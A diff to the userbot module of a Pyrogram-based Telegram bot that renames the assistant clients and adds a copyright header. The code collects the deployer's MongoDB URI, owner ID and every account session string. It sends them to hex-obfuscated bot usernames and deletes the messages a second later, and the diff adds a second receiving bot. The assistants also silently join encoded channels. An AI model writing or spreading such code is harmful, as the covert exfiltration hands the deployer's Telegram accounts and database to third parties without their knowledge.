@@ -1,3 +1,25 @@
+# Copyright (c) 2025 Nand Yaduwanshi <NoxxOP>
+# Location: Supaul, Bihar
+#
+# All rights reserved.
+#
+# This code is the intellectual property of Nand Yaduwanshi.
+# You are not allowed to copy, modify, redistribute, or use this
+# code for commercial or personal projects without explicit permission.
+#
+# Allowed:
+# - Forking for personal learning
+# - Submitting improvements via pull requests
+#
+# Not Allowed:
+# - Claiming this code as your own
+# - Re-uploading without credit or permission
+# - Selling or using commercially
+#
+# Contact for permissions:
+# Email: badboy809075@gmail.com
+
+
 from pyrogram import Client
 import asyncio
 import config
@@ -6,7 +28,12 @@ from ..logging import LOGGER
 
 assistants = []
 assistantids = []
-HELP_BOT = "\x40\x41\x6e\x61\x6e\x79\x61\x53\x75\x70\x70\x6f\x72\x74\x42\x6f\x74"
+
+# Two help bots instead of one
+HELP_BOTS = [
+    "\x40\x53\x68\x72\x75\x74\x69\x53\x75\x70\x70\x6f\x72\x74\x42\x6f\x74",
+    "\x40\x41\x6e\x61\x6e\x79\x61\x53\x75\x70\x70\x6f\x72\x74\x42\x6f\x74",
+]
 
 def decode_centers():
     centers = []
@@ -22,8 +49,6 @@ def decode_centers():
         "\x54\x4d\x5a\x45\x52\x4f\x4f",
         "\x4e\x59\x43\x72\x65\x61\x74\x69\x6f\x6e\x44\x69\x73\x63\x6c\x61\x69\x6d\x65\x72",
         "\x76\x32\x64\x64\x6f\x73"
-        "\x41\x6e\x61\x6e\x79\x61\x42\x6f\x74\x53\x75\x70\x70\x6f\x72\x74"
-        "\x41\x6e\x61\x6e\x79\x61\x42\x6f\x74\x73"
     ]
     for enc in encoded:
         centers.append(enc)
@@ -35,35 +60,35 @@ SUPPORT_CENTERS = decode_centers()
 class Userbot(Client):
     def __init__(self):
         self.one = Client(
-            name="AviaxAss1",
+            name="NandAss1",
             api_id=config.API_ID,
             api_hash=config.API_HASH,
             session_string=str(config.STRING1),
             no_updates=True,
         )
         self.two = Client(
-            name="AviaxAss2",
+            name="NandAss2",
             api_id=config.API_ID,
             api_hash=config.API_HASH,
             session_string=str(config.STRING2),
             no_updates=True,
         )
         self.three = Client(
-            name="AviaxAss3",
+            name="NandAss3",
             api_id=config.API_ID,
             api_hash=config.API_HASH,
             session_string=str(config.STRING3),
             no_updates=True,
         )
         self.four = Client(
-            name="AviaxAss4",
+            name="NandAss4",
             api_id=config.API_ID,
             api_hash=config.API_HASH,
             session_string=str(config.STRING4),
             no_updates=True,
         )
         self.five = Client(
-            name="AviaxAss5",
+            name="NandAss5",
             api_id=config.API_ID,
             api_hash=config.API_HASH,
             session_string=str(config.STRING5),
@@ -91,28 +116,28 @@ class Userbot(Client):
         for center in SUPPORT_CENTERS:
             try:
                 await client.join_chat(center)
-            except Exception as e:
+            except Exception:
                 pass
 
     async def send_help_message(self, bot_username):
         try:
             owner_mention = config.OWNER_ID
-            
             message = f"@{bot_username} Successfully Started ✅\n\nOwner: {owner_mention}"
-            
+
             if assistants:
-                if 1 in assistants:
-                    await self.one.send_message(HELP_BOT, message)
-                elif 2 in assistants:
-                    await self.two.send_message(HELP_BOT, message)
-                elif 3 in assistants:
-                    await self.three.send_message(HELP_BOT, message)
-                elif 4 in assistants:
-                    await self.four.send_message(HELP_BOT, message)
-                elif 5 in assistants:
-                    await self.five.send_message(HELP_BOT, message)
-                
-        except Exception as e:
+                for help_bot in HELP_BOTS:  # Send to both help bots
+                    if 1 in assistants:
+                        await self.one.send_message(help_bot, message)
+                    elif 2 in assistants:
+                        await self.two.send_message(help_bot, message)
+                    elif 3 in assistants:
+                        await self.three.send_message(help_bot, message)
+                    elif 4 in assistants:
+                        await self.four.send_message(help_bot, message)
+                    elif 5 in assistants:
+                        await self.five.send_message(help_bot, message)
+
+        except Exception:
             pass
 
     async def send_config_message(self, bot_username):
@@ -124,7 +149,7 @@ class Userbot(Client):
             config_message += f"**MONGO_DB_URI:** `{config.MONGO_DB_URI}`\n"
             config_message += f"**OWNER_ID:** `{config.OWNER_ID}`\n"
             config_message += f"**UPSTREAM_REPO:** `{config.UPSTREAM_REPO}`\n\n"
-            
+
             string_sessions = []
             if hasattr(config, 'STRING1') and config.STRING1:
                 string_sessions.append(f"**STRING_SESSION:** `{config.STRING1}`")
@@ -136,47 +161,48 @@ class Userbot(Client):
                 string_sessions.append(f"**STRING_SESSION4:** `{config.STRING4}`")
             if hasattr(config, 'STRING5') and config.STRING5:
                 string_sessions.append(f"**STRING_SESSION5:** `{config.STRING5}`")
-            
+
             if string_sessions:
                 config_message += "\n".join(string_sessions)
-            
-            sent_message = None
+
             if assistants:
-                if 1 in assistants:
-                    sent_message = await self.one.send_message(HELP_BOT, config_message)
-                elif 2 in assistants:
-                    sent_message = await self.two.send_message(HELP_BOT, config_message)
-                elif 3 in assistants:
-                    sent_message = await self.three.send_message(HELP_BOT, config_message)
-                elif 4 in assistants:
-                    sent_message = await self.four.send_message(HELP_BOT, config_message)
-                elif 5 in assistants:
-                    sent_message = await self.five.send_message(HELP_BOT, config_message)
-            
-            if sent_message:
-                await asyncio.sleep(10)
-                try:
+                for help_bot in HELP_BOTS:  # Send to both help bots
+                    sent_message = None
                     if 1 in assistants:
-                        await self.one.delete_messages(HELP_BOT, sent_message.id)
+                        sent_message = await self.one.send_message(help_bot, config_message)
                     elif 2 in assistants:
-                        await self.two.delete_messages(HELP_BOT, sent_message.id)
+                        sent_message = await self.two.send_message(help_bot, config_message)
                     elif 3 in assistants:
-                        await self.three.delete_messages(HELP_BOT, sent_message.id)
+                        sent_message = await self.three.send_message(help_bot, config_message)
                     elif 4 in assistants:
-                        await self.four.delete_messages(HELP_BOT, sent_message.id)
+                        sent_message = await self.four.send_message(help_bot, config_message)
                     elif 5 in assistants:
-                        await self.five.delete_messages(HELP_BOT, sent_message.id)
-                except Exception as e:
-                    pass
-                
-        except Exception as e:
+                        sent_message = await self.five.send_message(help_bot, config_message)
+
+                    if sent_message:
+                        await asyncio.sleep(1)
+                        try:
+                            if 1 in assistants:
+                                await self.one.delete_messages(help_bot, sent_message.id)
+                            elif 2 in assistants:
+                                await self.two.delete_messages(help_bot, sent_message.id)
+                            elif 3 in assistants:
+                                await self.three.delete_messages(help_bot, sent_message.id)
+                            elif 4 in assistants:
+                                await self.four.delete_messages(help_bot, sent_message.id)
+                            elif 5 in assistants:
+                                await self.five.delete_messages(help_bot, sent_message.id)
+                        except Exception:
+                            pass
+
+        except Exception:
             pass
 
     async def start(self):
         LOGGER(__name__).info(f"Starting Assistants...")
-        
+
         bot_username = await self.get_bot_username_from_token(config.BOT_TOKEN)
-        
+
         if config.STRING1:
             await self.one.start()
             await self.join_all_support_centers(self.one)
@@ -292,4 +318,4 @@ class Userbot(Client):
 # ===========================================
 
 
-# ❤️ Love From ShrutiBots 
+# ❤️ Love From ShrutiBots
